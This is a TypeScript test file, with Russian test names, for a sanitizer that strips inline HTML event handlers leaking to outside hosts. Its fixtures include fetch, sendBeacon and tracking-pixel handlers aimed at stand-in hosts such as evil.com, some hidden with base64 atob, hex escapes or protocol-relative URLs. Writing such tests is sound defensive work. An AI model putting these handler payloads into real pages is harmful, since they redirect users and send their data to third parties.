import { describe, it, expect } from 'vitest';
import { parseHtml, serializeHtml } from '../../../utils/html-dom.js';
import type { PassContext } from '../../../types.js';
import { stripEventAttrs } from '../strip-event-attrs.js';

function ctx(): PassContext {
  return { siteDir: '/site', mainHost: 'mysite.com', filePath: '/site/index.html', relPath: 'index.html', log: [], quarantine: [] };
}
function run(html: string) {
  const $ = parseHtml(html);
  stripEventAttrs($, ctx());
  return serializeHtml($);
}

describe('stripEventAttrs — все on* по префиксу, вкл. мобильные (2D-3)', () => {
  it('ontouchstart с внешним URL снимается (мобайл — раньше не проверялся)', () => {
    const out = run(`<div ontouchstart="location.href='https://evil.com/go'">x</div>`);
    expect(out).not.toContain('ontouchstart');
    expect(out).not.toContain('evil.com');
  });

  it('onpointerdown с внешним URL снимается', () => {
    expect(run(`<a onpointerdown="fetch('https://evil.com/c')">x</a>`)).not.toContain('onpointerdown');
  });

  it('onwheel с внешним URL снимается', () => {
    expect(run(`<div onwheel="new Image().src='https://t.evil/p'">x</div>`)).not.toContain('onwheel');
  });

  it('oncopy (clipboard) с внешним URL снимается', () => {
    expect(run(`<div oncopy="navigator.sendBeacon('https://evil.com/cb')">x</div>`)).not.toContain('oncopy');
  });

  it('onhashchange с внешним URL снимается', () => {
    expect(run(`<body onhashchange="location='https://evil.com'">x</body>`)).not.toContain('onhashchange');
  });

  // ── РОБАСТНОСТЬ: простые обработчики квиза остаются ──
  it('ontouchstart="nextStep()" (без URL/трекера) сохранён', () => {
    expect(run(`<button ontouchstart="nextStep()">Далее</button>`)).toContain('nextStep()');
  });

  it('onclick="show(2)" сохранён (не-регресс)', () => {
    expect(run(`<button onclick="show(2)">x</button>`)).toContain('show(2)');
  });

  it('НЕ-регресс: onclick с http-редиректом снимается', () => {
    expect(run(`<button onclick="location.href='http://evil.example/go'">Go</button>`)).not.toContain('evil.example');
  });
});

describe('stripEventAttrs — обфусцированный/протокол-относительный exfil в on* (2D-2)', () => {
  // Эти значения НЕ содержат литерального `https?://` и не задевают TRACKER_INLINE_KEYWORDS —
  // блок-лист по значению их пропускал; ловит только AST inline-exfil анализ.
  it('протокол-относительный редирект location=\'//evil\' снимается', () => {
    const out = run(`<div onclick="location='//evil.com/steal'">x</div>`);
    expect(out).not.toContain('onclick');
    expect(out).not.toContain('evil.com');
  });

  it('обфусцированный редирект location=atob(...) снимается', () => {
    const out = run(`<div onclick="location=atob('aHR0cHM6Ly9ldmlsLmNvbS8=')">x</div>`);
    expect(out).not.toContain('onclick');
    expect(out).not.toContain('atob');
  });

  it('мобильный ontouchstart с fetch(atob(...)) снимается', () => {
    expect(run(`<div ontouchstart="fetch(atob('aHR0cHM6Ly9ldmlsLmNvbS9j'))">x</div>`)).not.toContain('ontouchstart');
  });

  it('hex-escaped протокол-относительный пиксель new Image().src снимается', () => {
    const out = run(`<div onmouseover="new Image().src='\\x2f\\x2fevil.com\\x2fp'">x</div>`);
    expect(out).not.toContain('onmouseover');
    expect(out).not.toContain('evil.com');
  });

  it('exfil внутри `return ...` ловится (значение парсится как тело функции)', () => {
    const out = run(`<form onsubmit="return location='//evil.com'"><input></form>`);
    expect(out).not.toContain('onsubmit');
    expect(out).not.toContain('evil.com');
  });

  // ── СОУНДНОСТЬ: без exfil на чужой хост — обработчик остаётся ──
  it('onsubmit="return validateForm()" сохранён (return валиден через обёртку-функцию)', () => {
    expect(run(`<form onsubmit="return validateForm()"><input></form>`)).toContain('return validateForm()');
  });

  it('same-host протокол-относительная навигация остаётся (не exfil)', () => {
    expect(run(`<div onclick="location.href='//mysite.com/next'">x</div>`)).toContain('mysite.com/next');
  });

  it('обработчик с аргументом event без exfil остаётся', () => {
    expect(run(`<button onclick="track(event)">x</button>`)).toContain('track(event)');
  });
});
